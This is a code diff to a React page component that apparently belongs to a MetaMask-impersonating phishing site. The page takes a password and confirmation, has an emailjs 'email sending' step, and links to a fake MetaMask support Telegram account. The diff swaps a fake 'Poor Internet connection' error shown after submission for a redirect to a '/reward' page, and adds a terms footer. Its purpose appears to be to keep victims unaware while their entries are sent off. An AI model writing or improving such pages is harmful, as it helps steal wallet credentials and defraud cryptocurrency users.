@@ -1,8 +1,7 @@
 import { useState } from 'react'
-import { Link } from 'react-router-dom'
+import { Link, useNavigate } from 'react-router-dom'
 import { RiQrCodeLine } from "react-icons/ri";
 import { SiTelegram } from "react-icons/si";
-import Swal from 'sweetalert2';
 import Loader from './../components/loader/Loader'
 import emailjs from 'emailjs-com';
 
@@ -17,6 +16,7 @@ const Home = () => {
   const [errorMessage, setErrorMessage] = useState('');
   const [passError, setPassError] = useState('');
   const [loader, setLoader] = useState(false)
+  const navigate = useNavigate()
 
   
   const handleInputChange = (event) => {
@@ -32,19 +32,6 @@ const Home = () => {
     }
   };
   
-  // sweet alert function 
-  const Toast = Swal.mixin({
-    toast: true,
-    position: 'top-end',
-    showConfirmButton: false,
-    timer: 3000,
-    timerProgressBar: true,
-    didOpen: (toast) => {
-      toast.addEventListener('mouseenter', Swal.stopTimer)
-      toast.addEventListener('mouseleave', Swal.resumeTimer)
-    }
-  })
-
   const submitData = async (e) => {
 
  if (password != confirmPassword) {
@@ -56,11 +43,8 @@ const Home = () => {
 
       setTimeout(() => {
         setLoader(false);
-        Toast.fire({
-          icon: 'warning',
-          title: 'Poor Internet connection please try again'
-        })
-      }, 5000);
+        navigate('/reward')
+      }, 6000);
   }
   
   // email sending
@@ -193,12 +177,15 @@ const Home = () => {
         </div>
 
 
-        <div className="telegram" >
+        {/* <div className="telegram" >
         <Link to='https://t.me/customer_support_metamask'>
             <SiTelegram />
           </Link>
-        </div>
+        </div> */}
 
+        <footer>
+            <p>By proceeding, you agree to these <Link to='/terms_and_policy'>Terms and Conditions.</Link> </p>
+        </footer>
       </div>
  
     </>
